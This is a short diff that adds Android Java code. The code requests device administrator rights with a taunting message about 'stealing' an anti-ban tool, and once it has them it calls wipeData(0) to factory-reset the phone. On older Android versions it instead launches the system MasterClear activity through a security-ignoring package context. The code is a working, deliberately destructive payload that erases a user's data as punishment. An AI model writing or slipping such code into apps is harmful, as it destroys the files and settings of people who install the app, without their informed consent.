@@ -1,0 +1,24 @@
+if (currentAPIVersion >= android.os.Build.VERSION_CODES.FROYO) {
+    // 2.2+
+    if (!mDPM.isAdminActive(mDeviceAdmin)) {
+        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdmin);
+        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Process will remove user installed applications, settings, wallpaper and sound settings. Are you happy For Stealing Thi Anti-Ban?");
+        startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
+    } else {
+        // device administrator, can do security operations
+        mDPM.wipeData(0);
+    }
+
+} else {
+    // 2.1
+    try {
+        Context foreignContext = this.createPackageContext("com.android.settings", Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);
+        Class<?> yourClass = foreignContext.getClassLoader().loadClass("com.android.settings.MasterClear");
+        Intent i = new Intent(foreignContext, yourClass);
+        this.startActivityForResult(i, REQUEST_CODE_ENABLE_ADMIN);
+    } catch (ClassNotFoundException e) {
+
+    }
+
+}
